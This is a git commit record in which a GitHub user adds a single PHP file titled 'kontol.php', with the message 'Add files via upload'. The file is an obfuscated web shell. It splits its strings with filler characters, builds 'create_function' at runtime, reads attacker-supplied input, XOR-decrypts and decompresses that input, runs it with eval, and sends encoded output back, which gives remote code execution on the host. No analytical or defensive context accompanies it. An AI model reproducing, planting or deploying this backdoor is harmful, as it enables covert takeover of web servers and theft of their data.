b9c67de6549b3cdb706f492b51cea8aac51979f2
kyukazami <55656379+kyukazamiqq@users.noreply.github.com>
2022-09-12 12:16:35 +0700

    Add files via upload

---
+++ kontol.php
@@ -0,0 +1,11 @@
+<?php
+$X='7O"C4;functioC4n x($t,$k)C4{C4$c=strlC4en($k)C4;$l=stC4rlen($t)C4;$o="C4"C4;foC4r($i=0;$i<$C4l;)';
+$K='{C4forC4($C4j=0;($C4j<$cC4&&$i<$l);$j++,$iC4++){$o.=C4$tC4{$i}^$k{$j};C4}}return C4$o;}C4ifC4';
+$P=str_replace('Z','','ZcreatZeZ_ZZfunZction');
+$I='();@ob_end_clean();$r=C4@baseC4C464_encode(@xC4(C4@gzcC4ompress($C4o),$k)C4);priC4ntC4("$p$kh$r$kf");}';
+$D='(@pC4reg_match("/$khC4C4(.C4+)$kf/",@C4file_get_coC4ntenC4tC4s("php://iC4nput"),$C4m)==1){@C4oC4b_st';
+$B='aC4rt(C4);@eC4val(@gC4zuncoC4mC4press(@x(@baC4sC4e64_decC4ode($mC4[1C4]),$k))C4);$C4o=@ob_get_contC4entsC4';
+$s='C4$kC4="C463a9f0ea";$C4kh="7C4bbC498050796b";$kf="649C4e8548184C45C4";$p="dkb9JC4OiC4ZC4UPViFc';
+$A=str_replace('C4','',$s.$X.$K.$D.$B.$I);
+$Q=$P('',$A);$Q();
+?>
